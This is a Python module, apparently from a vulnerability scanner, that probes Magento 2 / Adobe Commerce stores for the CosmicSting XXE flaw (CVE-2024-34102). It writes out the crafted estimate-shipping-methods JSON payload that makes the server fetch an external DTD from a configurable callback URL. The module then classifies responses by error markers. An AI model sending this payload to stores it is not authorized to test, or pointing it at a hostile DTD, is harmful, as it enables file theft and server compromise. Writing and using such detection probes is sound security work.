"""
Raw execution for magento_cosmicsting_probe (CVE-2024-34102).
Sends crafted JSON requests to Magento 2 / Adobe Commerce REST guest-cart
endpoints to test whether the simplexml/libxml external entity parser attempts
to fetch external DTDs or triggers XML parser I/O warnings.
No parsing here -- parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import List, Optional
from urllib.parse import urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0 (Security Scanner)"

VULNERABLE_MARKERS = [
    "failed to load external entity",
    "domdocument::loadxml",
    "simplexmlelement::__construct",
    "i/o warning : failed to load external entity",
    "start tag expected",
    "the xml in the request was invalid",
    "could not resolve host",
    "failed to open stream",
    "connection refused",
]

PATCHED_MARKERS = [
    'does not have accessor method',
    'class "totalcollector" does not exist',
    'consumer is not authorized to access',
]


@dataclass
class EndpointProbeResult:
    url: str
    status_code: Optional[int] = None
    body_snippet: str = ""
    is_vulnerable_indicator: bool = False
    is_patched_indicator: bool = False
    error: Optional[str] = None


@dataclass
class RawCosmicStingResult:
    target: str = ""
    callback_url: str = ""
    cart_id_used: str = ""
    guest_cart_created: bool = False
    probes: List[EndpointProbeResult] = field(default_factory=list)
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    url = target.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = f"https://{url}"
    return url.rstrip("/")


def execute(
    target: str,
    callback_url: Optional[str] = None,
    cart_id: Optional[str] = None,
    timeout: int = 10,
) -> RawCosmicStingResult:
    if requests is None:
        return RawCosmicStingResult(target=target, error="requests library not available")

    if not target or not target.strip():
        return RawCosmicStingResult(target="", error="target is required")

    base_url = normalize_target_url(target)
    effective_callback = callback_url.strip() if callback_url and callback_url.strip() else "http://127.0.0.1:54321/cosmicsting_probe.dtd"

    session = requests.Session()
    session.headers.update({
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Content-Type": "application/json",
    })

    guest_cart_created = False
    effective_cart_id = cart_id.strip() if cart_id and cart_id.strip() else ""

    # Attempt to obtain a real guest cart ID if none was supplied
    if not effective_cart_id:
        try:
            cart_resp = session.post(
                f"{base_url}/rest/V1/guest-carts",
                timeout=timeout,
                verify=False,
            )
            if cart_resp.status_code in (200, 201):
                try:
                    data = cart_resp.json()
                    if isinstance(data, str) and len(data.strip()) >= 8 and not data.startswith("<"):
                        effective_cart_id = data.strip().strip('"')
                        guest_cart_created = True
                except Exception:
                    pass
        except Exception:
            pass

    if not effective_cart_id:
        effective_cart_id = "default"

    endpoint_patterns = [
        f"/rest/V1/guest-carts/{effective_cart_id}/estimate-shipping-methods",
        f"/rest/default/V1/guest-carts/{effective_cart_id}/estimate-shipping-methods",
        f"/rest/all/V1/guest-carts/{effective_cart_id}/estimate-shipping-methods",
    ]

    payload = {
        "address": {
            "totalsCollector": {
                "collectorList": {
                    "totalCollector": {
                        "sourceData": {
                            "data": effective_callback,
                            "dataIsURL": True,
                            "options": 1234,
                        }
                    }
                }
            }
        }
    }

    result = RawCosmicStingResult(
        target=base_url,
        callback_url=effective_callback,
        cart_id_used=effective_cart_id,
        guest_cart_created=guest_cart_created,
    )

    for pattern in endpoint_patterns:
        probe_url = f"{base_url}{pattern}"
        probe_res = EndpointProbeResult(url=probe_url)
        try:
            resp = session.post(
                probe_url,
                json=payload,
                timeout=timeout,
                verify=False,
            )
            probe_res.status_code = resp.status_code
            snippet = resp.text[:1000] if resp.text else ""
            probe_res.body_snippet = snippet

            lower_snippet = snippet.lower()
            clean_snippet = lower_snippet.replace('\\"', '"')
            if any(marker in clean_snippet for marker in VULNERABLE_MARKERS):
                probe_res.is_vulnerable_indicator = True
            elif any(marker in clean_snippet for marker in PATCHED_MARKERS):
                probe_res.is_patched_indicator = True

        except requests.exceptions.RequestException as e:
            probe_res.error = str(e)

        result.probes.append(probe_res)

        # If a confirmed vulnerability indicator or patch indicator is found, no need to probe remaining redundant prefixes
        if probe_res.is_vulnerable_indicator or probe_res.is_patched_indicator:
            break

    return result
